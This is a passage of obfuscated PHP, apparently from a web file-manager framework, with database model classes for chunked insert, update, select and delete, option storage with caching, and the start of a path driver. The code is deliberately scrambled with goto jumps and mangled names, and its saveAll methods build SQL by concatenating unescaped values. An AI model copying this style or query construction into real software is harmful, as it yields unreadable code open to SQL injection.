²Ãœˆ[$DÚœ£‰İ±—[1]]; break; case $Cô›‚ôïµá[292]: $a³âŒ³ê® = $CŠ– ²Ãœˆ[$DÜÉä‡Ü®™]; $CŠ– ²Ãœˆ[$DÜÉä‡Ü®™] = json_decode($a³âŒ³ê®, !0); if (is_null($CŠ– ²Ãœˆ[$DÜÉä‡Ü®™])) { $CŠ– ²Ãœˆ[$DÜÉä‡Ü®™] = $a³âŒ³ê®; } break; case $Cô›‚ôïµá[321]: if ($CŠ– ²Ãœˆ[$DÜÉä‡Ü®™] === $Cô›‚ôïµá[33]) { unset($CŠ– ²Ãœˆ[$DÜÉä‡Ü®™]); } break; case $Cô›‚ôïµá[322]: $CŠ– ²Ãœˆ[$DÜÉä‡Ü®™] = $DÚœ£‰İ±—[1]; default: break; } } } public function saveAll($aöÊÀ…Ÿ‘) { goto d‡£àÜŒ¦š; d‡£àÜŒ¦š: $E¢Æãé‡”ø =& $_SERVER[ä°„ä°º]; $Eªé¥ÑŠˆ = $this->tablePrefix . $this->tableName; $Fößæ³±ëé = self::SQL_WHERE_IN_CHUNK; goto BµŒÓøÊ; cä––ßù§×: $cŒ…Ûš»¼¸ = array(); $DÏ›ö…—Óß = count($aöÊÀ…Ÿ‘); for ($c¿À¨ñŸÛß = 0; $c¿À¨ñŸÛß < $DÏ›ö…—Óß; $c¿À¨ñŸÛß++) { $BëïÑø«®‹ = $aöÊÀ…Ÿ‘[$c¿À¨ñŸÛß]; if (!is_array($BëïÑø«®‹) || count($BëïÑø«®‹) != 4) { continue; } $dÆõ¨²¹Å™ = "\x55\120\x44\x41\x54\x45\x20\140{$Eªé¥ÑŠˆ}\x60\x20\123\105\x54\40{$BëïÑø«®‹[2]}\40\x3d\40\103\x41\123\x45\40{$BëïÑø«®‹[0]}\x20\12"; if ($B£·îŒÉïÑ == 0) { $Dİù’‰ù… = $dÆõ¨²¹Å™; } $cŒ…Ûš»¼¸[] = $E¢Æãé‡”ø[116] . $BëïÑø«®‹[1] . $E¢Æãé‡”ø[116]; $B£·îŒÉïÑ++; $Dİù’‰ù… .= "\x20\x57\110\x45\x4e\40\x27{$BëïÑø«®‹[1]}\x27\40\124\x48\x45\116\40\47{$BëïÑø«®‹[3]}\x27\x20\xa"; if ($B£·îŒÉïÑ == $Fößæ³±ëé || $c¿À¨ñŸÛß == $DÏ›ö…—Óß - 1) { goto E°İÅÀÇŠ; E°İÅÀÇŠ: $a¦œÃ”à± = implode($E¢Æãé‡”ø[47], $cŒ…Ûš»¼¸); $Dİù’‰ù… .= "\40\x45\x4e\x44\x20\x20\x57\x48\105\x52\x45\x20{$BëïÑø«®‹[0]}\40\111\x4e\x20\50{$a¦œÃ”à±}\51\x20"; $this->execute($Dİù’‰ù…); goto B¤Âƒ„¹»è; B¤Âƒ„¹»è: $B£·îŒÉïÑ = 0; $Dİù’‰ù… = $dÆõ¨²¹Å™; $this->chunkEventCheck(count($cŒ…Ûš»¼¸)); goto f‰“ÜÒ‰; f‰“ÜÒ‰: $cŒ…Ûš»¼¸ = array(); goto bÔ§ó¿èÉ; bÔ§ó¿èÉ: } } goto E°†“åß†Â; BµŒÓøÊ: $aöÊÀ…Ÿ‘ = is_array($aöÊÀ…Ÿ‘) ? $aöÊÀ…Ÿ‘ : array(); $Dİù’‰ù… = $E¢Æãé‡”ø[375]; $B£·îŒÉïÑ = 0; goto cä––ßù§×; E°†“åß†Â: $this->chunkEventSet(); goto e’ºø¨†; e’ºø¨†: } public function saveAllEach($a¹Ç¹èµÎ¾) { $aëùß‚Ò»á =& $_SERVER[ä°„ä°º]; $A¯Û‘òÌ‚› = $this->tablePrefix . $this->tableName; foreach ($a¹Ç¹èµÎ¾ as $bÒ†„É¦éµ) { if (!is_array($bÒ†„É¦éµ) || count($bÒ†„É¦éµ) != 4) { continue; } $e§‰®ã›•Ò = $bÒ†„É¦éµ[0] . $aëùß‚Ò»á[376] . $bÒ†„É¦éµ[1] . $aëùß‚Ò»á[116]; $B´†‰¯Õ¤ğ = $bÒ†„É¦éµ[2] . $aëùß‚Ò»á[376] . $bÒ†„É¦éµ[3] . $aëùß‚Ò»á[116]; $b‡Ğ’ƒåÏ = "\x75\x70\144\141\x74\145\40{$A¯Û‘òÌ‚›}\x20\x73\x65\164\40{$B´†‰¯Õ¤ğ}\x20\167\x68\145\x72\x65\x20{$e§‰®ã›•Ò}\73"; $this->execute($b‡Ğ’ƒåÏ); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($béù­íØİœ = false, $dÂÈ« „îÈ = false) { $this->_chunkEvent = $béù­íØİœ; $this->_chunkEventParam = $dÂÈ« „îÈ; } private function chunkEventCheck($E‰ªÌ¾Ş‚) { if (!$this->_chunkEvent) { return; } $B¾ˆ´¡Ñæ· = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $B¾ˆ´¡Ñæ·[$_SERVER[ä°„ä°º][377]] = $E‰ªÌ¾Ş‚; Hook::trigger($this->_chunkEvent, $B¾ˆ´¡Ñæ·); } public function addAll($cŞïˆ‰›½, $fêÚÂ«‹ÀÕ = array(), $eø˜²Ä‰çó = false) { goto EèÍ¶‚‚‡Œ; EèÍ¶‚‚‡Œ: $dØè±„¡Ş =& $_SERVER[ä°„ä°º]; ignore_timeout(); $d³Íùß±í• = self::SQL_WHERE_IN_CHUNK; goto F¢×®Šùè; BøƒÈ¡‰Ëà: if (method_exists($this->db, $dØè±„¡Ş[270])) { for ($CÌ§ «é¾Ğ = 0; $CÌ§ «é¾Ğ < count($cŞïˆ‰›½); $CÌ§ «é¾Ğ += $d³Íùß±í•) { $f¢ò—ãÙÈ = array_slice($cŞïˆ‰›½, $CÌ§ «é¾Ğ, $d³Íùß±í•); if (!is_array($f¢ò—ãÙÈ) || count($f¢ò—ãÙÈ) == 0) { break; } $E¾™˜ò«†  = $this->db->insertAll($f¢ò—ãÙÈ, $fêÚÂ«‹ÀÕ, $eø˜²Ä‰çó); $this->chunkEventCheck(count($f¢ò—ãÙÈ)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($cŞïˆ‰›½ as $E¡™Ë‘ïÕ => $d˜°âØœ²â) { $E¾™˜ò«†  = $this->db->insert($d˜°âØœ²â, $fêÚÂ«‹ÀÕ, $eø˜²Ä‰çó); } $this->commit(); } if (!1 !== $E¾™˜ò«† ) { $Cœ©ßù· ‚ = $this->getLastInsID(); if ($Cœ©ßù· ‚) { return $Cœ©ßù· ‚; } } return $E¾™˜ò«† ; goto BÓ´ŸºÎ†ß; F¢×®Šùè: if (empty($cŞïˆ‰›½)) { $this->error = think_lang($dØè±„¡Ş[269]); return !1; } $fêÚÂ«‹ÀÕ = $this->_parseOptions($fêÚÂ«‹ÀÕ); foreach ($cŞïˆ‰›½ as $E¡™Ë‘ïÕ => $d˜°âØœ²â) { $cŞïˆ‰›½[$E¡™Ë‘ïÕ] = $this->_facade($d˜°âØœ²â); $this->_beforeInsert($cŞïˆ‰›½[$E¡™Ë‘ïÕ], $fêÚÂ«‹ÀÕ); } goto BøƒÈ¡‰Ëà; BÓ´ŸºÎ†ß: } public function save($BÆ‡ß›´´¾ = '', $dÊˆ‚‹è™Ø = array()) { goto BôÃ¨ó§„³; cŠôø ¬¢: $Eï¼ÙÌ ÌÃ = $this->findWhereField($eÌ‡†¢Ğ‚ì); if (!$Eï¼ÙÌ ÌÃ) { return parent::save($BÆ‡ß›´´¾, $dÊˆ‚‹è™Ø); } $A²ƒŒÏòË“ = 0; goto D¼ø£Şìİß; D¼ø£Şìİß: $eÌßÄ¦ ìÅ = $eÌ‡†¢Ğ‚ì[$FìºÒœƒ¼Î[273]][$Eï¼ÙÌ ÌÃ][1]; $eÌßÄ¦ ìÅ = is_array($eÌßÄ¦ ìÅ) ? $eÌßÄ¦ ìÅ : array(); $EÔÖÎ„²¯ = count($eÌßÄ¦ ìÅ); goto f©ô§•±·Ù; BôÃ¨ó§„³: $FìºÒœƒ¼Î =& $_SERVER[ä°„ä°º]; $CÇÚå†¿ç§ = self::SQL_WHERE_IN_CHUNK; $eÌ‡†¢Ğ‚ì = $this->optionsValue(); goto cŠôø ¬¢; f©ô§•±·Ù: for ($cä¢ŞøÙŒ = 0; $cä¢ŞøÙŒ < $EÔÖÎ„²¯; $cä¢ŞøÙŒ += $CÇÚå†¿ç§) { $cšİ¬©İì = array_slice($eÌßÄ¦ ìÅ, $cä¢ŞøÙŒ, $CÇÚå†¿ç§); if (!is_array($cšİ¬©İì) || count($cšİ¬©İì) == 0) { break; } $eÌ‡†¢Ğ‚ì[$FìºÒœƒ¼Î[273]][$Eï¼ÙÌ ÌÃ][1] = $cšİ¬©İì; $this->optionsValue($eÌ‡†¢Ğ‚ì); $A²ƒŒÏòË“ += parent::save($BÆ‡ß›´´¾, $dÊˆ‚‹è™Ø); $this->chunkEventCheck(count($cšİ¬©İì)); } $this->chunkEventSet(); return $A²ƒŒÏòË“; goto FÂìœ¢·¨; FÂìœ¢·¨: } public function add($f†°óÛ¯İ = '', $E³‚…›×‡Š = array(), $E÷ìÀŠé¾¼ = false) { if ($this->addTaskStatus && is_array($f†°óÛ¯İ)) { $this->addTaskData[] = $f†°óÛ¯İ; return; } return parent::add($f†°óÛ¯İ, $E³‚…›×‡Š, $E÷ìÀŠé¾¼); } public function parseWhereLike($díæ¸Š»‰Æ, $d»×­¼ÀÑ¬ = '', $F¢éÌ±ó¹ = false, &$DÖª»äçÅ“ = false) { goto EÍÙ½¹ˆƒ£; EÍÙ½¹ˆƒ£: $FÖöÔˆÂ¡Ç =& $_SERVER[ä°„ä°º]; $BÙİâ¦†‚© = $GLOBALS[$FÖöÔˆÂ¡Ç[6]][$FÖöÔˆÂ¡Ç[378]]; if (!$BÙİâ¦†‚©[$FÖöÔˆÂ¡Ç[379]]) { return $díæ¸Š»‰Æ; } goto DÅ×íá©ç»; DÅ×íá©ç»: if (!is_array($díæ¸Š»‰Æ)) { return $díæ¸Š»‰Æ; } $dŠ££Á¯»ô = array(); $FÌ’ùß¦Ñ£ = 0; goto aÊ¥êâ†Õ«; aÊ¥êâ†Õ«: foreach ($díæ¸Š»‰Æ as $dÔƒˆ¬ğÑ => $FöÅĞ¬°±) { if (is_array($FöÅĞ¬°±) && count($FöÅĞ¬°±) == 2 && $FöÅĞ¬°±[0] == $FÖöÔˆÂ¡Ç[380] && is_string($FöÅĞ¬°±[1]) && substr($FöÅĞ¬°±[1], 0, 1) == $FÖöÔˆÂ¡Ç[381] && substr($FöÅĞ¬°±[1], strlen($FöÅĞ¬°±[1]) - 1, 1) == $FÖöÔˆÂ¡Ç[381]) { goto EëÛ‡éøå¥; fÁÅÄêôˆ: continue; goto e¶˜Á¥ÍøÔ; EëÛ‡éøå¥: $DÖª»äçÅ“ = !0; $AÅ¥õ†Œ‹ = is_string($dÔƒˆ¬ğÑ) ? $dÔƒˆ¬ğÑ : $d»×­¼ÀÑ¬; $AõóîßæŒŸ = substr($FöÅĞ¬°±[1], 1, strlen($FöÅĞ¬°±[1]) - 2); goto c¨‹¬ŒÓÏù; b¸’åŒË: if ($BÙİâ¦†‚©[$FÖöÔˆÂ¡Ç[383]]) { $Eµ¸’Âïë = $FÖöÔˆÂ¡Ç[384] . $AõóîßæŒŸ . $FÖöÔˆÂ¡Ç[385]; if ($BÙİâ¦†‚©[$FÖöÔˆÂ¡Ç[386]]) { $Eµ¸’Âïë = $FÖöÔˆÂ¡Ç[385] . $AõóîßæŒŸ . $FÖöÔˆÂ¡Ç[384]; } } $dŠ££Á¯»ô[$FÌ’ùß¦Ñ£] = $FÖöÔˆÂ¡Ç[387] . $AÅ¥õ†Œ‹ . $FÖöÔˆÂ¡Ç[388] . $Eµ¸’Âïë . $FÖöÔˆÂ¡Ç[389]; $FÌ’ùß¦Ñ£++; goto fÁÅÄêôˆ; c¨‹¬ŒÓÏù: $AõóîßæŒŸ = $this->db->escapeString($AõóîßæŒŸ); if (!strpos($AÅ¥õ†Œ‹, $FÖöÔˆÂ¡Ç[95])) { $AÅ¥õ†Œ‹ = $FÖöÔˆÂ¡Ç[382] . $AÅ¥õ†Œ‹ . $FÖöÔˆÂ¡Ç[382]; } $Eµ¸’Âïë = $FÖöÔˆÂ¡Ç[182] . $AõóîßæŒŸ . $FÖöÔˆÂ¡Ç[182]; goto b¸’åŒË; e¶˜Á¥ÍøÔ: } if (is_array($FöÅĞ¬°±)) { $d»×­¼ÀÑ¬ = is_string($dÔƒˆ¬ğÑ) ? $dÔƒˆ¬ğÑ : $d»×­¼ÀÑ¬; $FöÅĞ¬°± = $this->parseWhereLike($FöÅĞ¬°±, $d»×­¼ÀÑ¬, !0, $DÖª»äçÅ“); } if (is_numeric($dÔƒˆ¬ğÑ)) { $dŠ££Á¯»ô[$FÌ’ùß¦Ñ£] = $FöÅĞ¬°±; $FÌ’ùß¦Ñ£++; } else { $dŠ££Á¯»ô[$dÔƒˆ¬ğÑ] = $FöÅĞ¬°±; } } if ($DÖª»äçÅ“ && !$F¢éÌ±ó¹) { } return $dŠ££Á¯»ô; goto aÚÚªÑ°; aÚÚªÑ°: } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($Cµâ›óÛ²½ = array()) { goto A¯ö‹ØË‚¸; CÉˆ³³…Á¤: $cÄî‚ÖŠÀŒ = $this->findWhereField($DêÛ«¡Éš); if (!$cÄî‚ÖŠÀŒ || isset($DêÛ«¡Éš[$F†¯ŸëÕ¬é[290]]) || isset($DêÛ«¡Éš[$F†¯ŸëÕ¬é[351]])) { return parent::select($Cµâ›óÛ²½); } $Cê¿àÎé•‹ = $DêÛ«¡Éš[$F†¯ŸëÕ¬é[273]][$cÄî‚ÖŠÀŒ][1]; goto B­²öˆ¾ª¤; A¯ö‹ØË‚¸: $F†¯ŸëÕ¬é =& $_SERVER[ä°„ä°º]; $f±ë‘ğÑŸ¢ = self::SQL_WHERE_IN_CHUNK; $DêÛ«¡Éš = $this->optionsValue(); goto CÉˆ³³…Á¤; cŸ±ÅÁ‚„º: return $e‚Š©¬¶¤; goto f®¶Ì“Í´“; B­²öˆ¾ª¤: $Cê¿àÎé•‹ = is_array($Cê¿àÎé•‹) ? $Cê¿àÎé•‹ : array(); $e‚Š©¬¶¤ = null; for ($E„±©Õé³Ì = 0; $E„±©Õé³Ì < count($Cê¿àÎé•‹); $E„±©Õé³Ì += $f±ë‘ğÑŸ¢) { $AÂœÄœ»è¿ = array_slice($Cê¿àÎé•‹, $E„±©Õé³Ì, $f±ë‘ğÑŸ¢); if (!is_array($AÂœÄœ»è¿) || count($AÂœÄœ»è¿) == 0) { break; } $DêÛ«¡Éš[$F†¯ŸëÕ¬é[273]][$cÄî‚ÖŠÀŒ][1] = $AÂœÄœ»è¿; $this->optionsValue($DêÛ«¡Éš); $F°åçíµÓå = parent::select($Cµâ›óÛ²½); if (!$F°åçíµÓå) { continue; } $e‚Š©¬¶¤ = is_array($e‚Š©¬¶¤) ? $e‚Š©¬¶¤ : array(); $e‚Š©¬¶¤ = array_merge($e‚Š©¬¶¤, $F°åçíµÓå); } goto cŸ±ÅÁ‚„º; f®¶Ì“Í´“: } public function delete($dìª—Ğ®õ = array()) { goto cƒÉ×é£·ã; F«†¼°µÄõ: return $BÓ¨¥œ£ğ; goto aÙö®¨Û†Ÿ; cƒÉ×é£·ã: $EÛÅ¢­ßœ =& $_SERVER[ä°„ä°º]; $cÇ³ƒ£İÛÈ = self::SQL_WHERE_IN_CHUNK; $e«ä‚ÊßÃØ = $this->optionsValue(); goto DÍÖ¦ØÓ¾™; eƒà‘ä÷ğĞ: $eæç¡ëíĞ˜ = $e«ä‚ÊßÃØ[$EÛÅ¢­ßœ[273]][$eº‹•‰«í][1]; $eæç¡ëíĞ˜ = is_array($eæç¡ëíĞ˜) ? $eæç¡ëíĞ˜ : array(); for ($b‡‹¾„¾ = 0; $b‡‹¾„¾ < count($eæç¡ëíĞ˜); $b‡‹¾„¾ += $cÇ³ƒ£İÛÈ) { $b¶Õ¶²Ÿ = array_slice($eæç¡ëíĞ˜, $b‡‹¾„¾, $cÇ³ƒ£İÛÈ); if (!is_array($b¶Õ¶²Ÿ) || count($b¶Õ¶²Ÿ) == 0) { break; } $e«ä‚ÊßÃØ[$EÛÅ¢­ßœ[273]][$eº‹•‰«í][1] = $b¶Õ¶²Ÿ; $this->optionsValue($e«ä‚ÊßÃØ); $BÓ¨¥œ£ğ += parent::delete($dìª—Ğ®õ); } goto F«†¼°µÄõ; DÍÖ¦ØÓ¾™: $eº‹•‰«í = $this->findWhereField($e«ä‚ÊßÃØ); if (!$eº‹•‰«í) { return parent::delete($dìª—Ğ®õ); } $BÓ¨¥œ£ğ = 0; goto eƒà‘ä÷ğĞ; aÙö®¨Û†Ÿ: } private function findWhereField($AŞÊóª«´ô) { $dïîèÃ’È÷ =& $_SERVER[ä°„ä°º]; $BÉôô£Îë… = self::SQL_WHERE_IN_CHUNK; if (!is_array($AŞÊóª«´ô) || !is_array($AŞÊóª«´ô[$dïîèÃ’È÷[273]])) { return !1; } foreach ($AŞÊóª«´ô[$dïîèÃ’È÷[273]] as $A¦±Ë‚Ÿ¸© => $C×ˆïõÌéô) { if (is_array($C×ˆïõÌéô) && isset($C×ˆïõÌéô[0]) && is_string($C×ˆïõÌéô[0]) && strtolower($C×ˆïõÌéô[0]) == $dïîèÃ’È÷[7] && is_array($C×ˆïõÌéô[1]) && count($C×ˆïõÌéô[1]) > $BÉôô£Îë…) { ignore_timeout(); return $A¦±Ë‚Ÿ¸©; } } return !1; } } class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\x79\x73\164\145\x6d\x4f\x70\164\151\x6f\156"; public $field = array(); public function listData($Fê…°ç¹µì = false, $D¹‘ç„î› = "\155\x6f\144\151\x66\171\x54\x69\x6d\x65", $a¥Áõ¸Œà³ = false) { $b˜‚ºç É = Model($this->modelType)->get(!1, $this->optionType, !0); if (!$b˜‚ºç É) { return $Fê…°ç¹µì ? null : array(); } if (!$Fê…°ç¹µì) { $b˜‚ºç É = array_filter(array_values($b˜‚ºç É)); return array_sort_by($b˜‚ºç É, $D¹‘ç„î›, $a¥Áõ¸Œà³); } return $b˜‚ºç É[$_SERVER[ä°„ä°º][390] . $Fê…°ç¹µì]; } public function insert($CŒ„¸Ş¸Ô) { goto EÖïÒ‚Şá; B«‰‹Ÿ‰: $CŒ„¸Ş¸Ô[$a’ƒê»ÛìŠ[84]] = time(); Model($this->modelType)->set($a’ƒê»ÛìŠ[391], $AÒèµ™„ °, $this->optionType . $a’ƒê»ÛìŠ[392]); Model($this->modelType)->set($a’ƒê»ÛìŠ[390] . $AÒèµ™„ °, $CŒ„¸Ş¸Ô, $this->optionType); goto CÚ­ù˜ñ; CÚ­ù˜ñ: return $AÒèµ™„ °; goto AßøË‡èÑÌ; Cğè×’è: $AÒèµ™„ ° = $AÒèµ™„ ° ? $AÒèµ™„ ° : 0; $CŒ„¸Ş¸Ô[$a’ƒê»ÛìŠ[393]] = ++$AÒèµ™„ °; $CŒ„¸Ş¸Ô[$a’ƒê»ÛìŠ[194]] = time(); goto B«‰‹Ÿ‰; EÖïÒ‚Şá: $a’ƒê»ÛìŠ =& $_SERVER[ä°„ä°º]; $CŒ„¸Ş¸Ô = array_field_key($CŒ„¸Ş¸Ô, $this->field); $AÒèµ™„ ° = Model($this->modelType)->get($a’ƒê»ÛìŠ[391], $this->optionType . $a’ƒê»ÛìŠ[392]); goto Cğè×’è; AßøË‡èÑÌ: } public function update($føò’Ğ‰îÁ, $D¯åšÅÓÃ¡) { goto bÈÂ‰‰åë¿; C•³¦¤ÇËÚ: return Model($this->modelType)->set($B–ƒ®‘‘çİ[390] . $føò’Ğ‰îÁ, $D¯åšÅÓÃ¡, $this->optionType); goto bÒ´¯òŒ±; bÈÂ‰‰åë¿: $B–ƒ®‘‘çİ =& $_SERVER[ä°„ä°º]; $D¯åšÅÓÃ¡ = array_field_key($D¯åšÅÓÃ¡, $this->field); $EšÀ…•İŒ’ = $this->listData($føò’Ğ‰îÁ); goto aà¤õôİéÅ; aà¤õôİéÅ: if (!$EšÀ…•İŒ’ || !$føò’Ğ‰îÁ) { return !1; } $D¯åšÅÓÃ¡ = array_merge($EšÀ…•İŒ’, $D¯åšÅÓÃ¡); $D¯åšÅÓÃ¡[$B–ƒ®‘‘çİ[84]] = time(); goto C•³¦¤ÇËÚ; bÒ´¯òŒ±: } public function remove($E³ì—»ŸŸÉ) { if (!$E³ì—»ŸŸÉ) { return !1; } return Model($this->modelType)->remove($_SERVER[ä°„ä°º][390] . $E³ì—»ŸŸÉ, $this->optionType); } public function clear() { $f”—¬’ŒŠÏ =& $_SERVER[ä°„ä°º]; Model($this->modelType)->remove($f”—¬’ŒŠÏ[391], $this->optionType . $f”—¬’ŒŠÏ[392]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($fâŒÉƒê¸å, $AğèÇ‘µä) { if (!$AğèÇ‘µä) { return !1; } $AÀ³™Ğ…‘† = $this->listData(); $AÀ³™Ğ…‘† = array_to_keyvalue($AÀ³™Ğ…‘†, $fâŒÉƒê¸å); return isset($AÀ³™Ğ…‘†[$AğèÇ‘µä]) ? $AÀ³™Ğ…‘†[$AğèÇ‘µä] : !1; } public function findByName($B¥ô£Á¸î©) { return $this->findByKey($_SERVER[ä°„ä°º][28], $B¥ô£Á¸î©); } protected function resetData($a¥‘ùß°Â¯) { $F»Å†Ğ’ =& $_SERVER[ä°„ä°º]; $a¥‘ùß°Â¯ = is_array($a¥‘ùß°Â¯) ? $a¥‘ùß°Â¯ : array(); $e×Ø³¾†óŞ = array(); for ($bˆàÉ„„‚‹ = 0; $bˆàÉ„„‚‹ < count($a¥‘ùß°Â¯); $bˆàÉ„„‚‹++) { $e×Ø³¾†óŞ[$F»Å†Ğ’[390] . $a¥‘ùß°Â¯[$bˆàÉ„„‚‹][$F»Å†Ğ’[393]]] = $a¥‘ùß°Â¯[$bˆàÉ„„‚‹]; } return Model($this->modelType)->set($e×Ø³¾†óŞ, !1, $this->optionType); } private function getAutoName($FÊ¾Ä°îî) { $b›ÑÊŸ´÷ = array_to_keyvalue($this->listData(), $_SERVER[ä°„ä°º][28]); if (!$b›ÑÊŸ´÷ || !isset($b›ÑÊŸ´÷[$FÊ¾Ä°îî])) { return $FÊ¾Ä°îî; } for ($cĞÂ‹¡Œï = 1; $cĞÂ‹¡Œï < count($b›ÑÊŸ´÷); $cĞÂ‹¡Œï++) { $Cá¿ëÛŠíç = $FÊ¾Ä°îî . "\50{$cĞÂ‹¡Œï}\51"; if (!isset($b›ÑÊŸ´÷[$Cá¿ëÛŠíç])) { return $Cá¿ëÛŠíç; } } return $Cá¿ëÛŠíç; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($dÖÁçèó–Ö = false, $f¯¦´Ù÷ì = '', $Eâ±Í¥›Ÿõ = false) { goto a®ÍÑÚ¡»ƒ; a®ÍÑÚ¡»ƒ: $dñ•·ˆ¥Àù =& $_SERVER[ä°„ä°º]; $aÉêÎ­Ø¢è = $this->cacheGet($f¯¦´Ù÷ì); $A³ŠŠàÅšÛ = $this->optionDefault($f¯¦´Ù÷ì); goto CÔ¶Ë•õ¦í; F¾—¹ˆ¸ğµ: $this->cacheSet($f¯¦´Ù÷ì, $aÉêÎ­Ø¢è); $aÉêÎ­Ø¢è = array_merge($A³ŠŠàÅšÛ, $aÉêÎ­Ø¢è); return $dÖÁçèó–Ö ? $aÉêÎ­Ø¢è[$dÖÁçèó–Ö] : $aÉêÎ­Ø¢è; goto eø–°†êŸÅ; e¬…ÁŒæî: $aÉêÎ­Ø¢è = $this->where($D­Ó ­‚±¢)->select(); $aÉêÎ­Ø¢è = array_to_keyvalue($aÉêÎ­Ø¢è, $dñ•·ˆ¥Àù[93], $dñ•·ˆ¥Àù[372]); foreach ($aÉêÎ­Ø¢è as $eÜš°“Õ«– => $aÍ½ŸÃ³Î ) { if ($Eâ±Í¥›Ÿõ || in_array($eÜš°“Õ«–, $this->jsonField)) { $aÉêÎ­Ø¢è[$eÜš°“Õ«–] = json_decode($aÍ½ŸÃ³Î , !0); } } goto F¾—¹ˆ¸ğµ; CÔ¶Ë•õ¦í: $A³ŠŠàÅšÛ = is_array($A³ŠŠàÅšÛ) ? $A³ŠŠàÅšÛ : array(); if (is_array($aÉêÎ­Ø¢è)) { $aÉêÎ­Ø¢è = array_merge($A³ŠŠàÅšÛ, $aÉêÎ­Ø¢è); return $dÖÁçèó–Ö ? isset($aÉêÎ­Ø¢è[$dÖÁçèó–Ö]) ? $aÉêÎ­Ø¢è[$dÖÁçèó–Ö] : null : $aÉêÎ­Ø¢è; } $D­Ó ­‚±¢ = $this->filterWhere(array($dñ•·ˆ¥Àù[29] => $f¯¦´Ù÷ì)); goto e¬…ÁŒæî; eø–°†êŸÅ: } public function set($e‹ˆè¿²É«, $D‡› ŒÛ±™ = false, $EÀ“µù‰™ = '') { goto BÎ¬Ÿ®¸ÖÚ; BÎ¬Ÿ®¸ÖÚ: $FˆÓñ‚ó =& $_SERVER[ä°„ä°º]; $this->cacheRemove($EÀ“µù‰™); $dâ…§ª­ = array(); goto c¹ÒŠ·ß­‹; dÅ¯’ÖŠ: return $this->addAll($dâ…§ª­, array(), !0); goto fŠ¤õ¨ï®ó; c¹ÒŠ·ß­‹: $f„áÙ‘»ªª = is_array($e‹ˆè¿²É«) ? $e‹ˆè¿²É« : array($e‹ˆè¿²É« => $D‡› ŒÛ±™); foreach ($f„áÙ‘»ªª as $BœŠ…Íãùà => $eŠ¤÷”á¨Õ) { if (is_array($eŠ¤÷”á¨Õ)) { $eŠ¤÷”á¨Õ = json_encode_force($eŠ¤÷”á¨Õ); } $this->checkLength($eŠ¤÷”á¨Õ, !1, $this->tableName . $FˆÓñ‚ó[4] . $e‹ˆè¿²É«); $eŠ¤÷”á¨Õ = self::textEncode($eŠ¤÷”á¨Õ); $f„áÙ‘»ªª = array($FˆÓñ‚ó[29] => $EÀ“µù‰™, $FˆÓñ‚ó[93] => $BœŠ…Íãùà, $FˆÓñ‚ó[372] => $eŠ¤÷”á¨Õ); $dâ…§ª­[] = $this->filterWhere($f„áÙ‘»ªª); } if (!$dâ…§ª­) { return !0; } goto dÅ¯’ÖŠ; fŠ¤õ¨ï®ó: } protected function optionDefault($a£§ƒÔ¼ = '') { return !1; } public function setDeep($eÇ•Ùíóñ, $BÎĞ¸‚¼ë = false, $E‚ƒ‚«ªš² = '') { $e‚°†„Òİò = explode($_SERVER[ä°„ä°º][95], $eÇ•Ùíóñ); $aËìÌ­áº = $this->get(); array_set_value($aËìÌ­áº, $eÇ•Ùíóñ, $BÎĞ¸‚¼ë); $this->set($e‚°†„Òİò[0], $aËìÌ­áº[$e‚°†„Òİò[0]], $E‚ƒ‚«ªš²); } public function remove($B‹“¼ëòİ, $F® ±ò›Ê† = '') { $e¼ÆÍĞ—åµ =& $_SERVER[ä°„ä°º]; $this->cacheRemove($F® ±ò›Ê†); $c—¬´ĞÎç = $this->filterWhere(array($e¼ÆÍĞ—åµ[93] => $B‹“¼ëòİ, $e¼ÆÍĞ—åµ[29] => $F® ±ò›Ê†)); if (is_null($B‹“¼ëòİ)) { unset($c—¬´ĞÎç[$e¼ÆÍĞ—åµ[93]]); } return $this->where($c—¬´ĞÎç)->delete(); } public function cacheSet($Båƒ†á„é™, $fÇ´ˆ±ê–Œ = false) { return Cache::set($this->cacheKey($Båƒ†á„é™), $fÇ´ˆ±ê–Œ); } public function cacheGet($b¹’Áğ©Ú) { return Cache::get($this->cacheKey($b¹’Áğ©Ú)); } public function cacheRemove($b˜¬Ôç½ã) { return Cache::remove($this->cacheKey($b˜¬Ôç½ã)); } protected function filterWhere($f¼”™Í¸ãƒ) { return $f¼”™Í¸ãƒ; } protected function cacheKey($b¿ÂÏ„ª·¯) { return $b¿ÂÏ„ª·¯; } } goto EŠ’‡ŠÊ„È; B¹‘ˆØƒÒ: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $EÀÎ¤ƒŸàà =& $_SERVER[ä°„ä°º]; $this->objectDriver = array($EÀÎ¤ƒŸàà[57], $EÀÎ¤ƒŸàà[58], $EÀÎ¤ƒŸàà[59], $EÀÎ¤ƒŸàà[60], $EÀÎ¤ƒŸàà[61], $EÀÎ¤ƒŸàà[62], $EÀÎ¤ƒŸàà[63], $EÀÎ¤ƒŸàà[64], $EÀÎ¤ƒŸàà[65]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($FòçÅ‡íá¢) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($FòçÅ‡íá¢, $_SERVER[ä°„ä°º][8]); } return $FòçÅ‡íá¢; } public function iconvApp($C¦×ƒ»İ®æ) { return $C¦×ƒ»İ®æ; } public function iconvSystem($a‘ÃÒ‡¹ã˜) { return $a‘ÃÒ‡¹ã˜; } public function iconvTo($Eªªİ”ÙàÕ, $Cğ‡ê¾å‚­, $dŞ¹ÍÇ‘±ˆ) { goto A‰¤çÓ²ª˜; A‰¤çÓ²ª˜: $eÑÀÕ¹… =& $_SERVER[ä°„ä°º]; if (!$Eªªİ”ÙàÕ || !function_exists($eÑÀÕ¹…[66])) { return $Eªªİ”ÙàÕ; } static $f¡‘…¬âŒ¿ = array(); goto cµ¿˜ÀÏ; cµ¿˜ÀÏ: $EœÄç¬¦ßØ = $Cğ‡ê¾å‚­ . $eÑÀÕ¹…[67] . 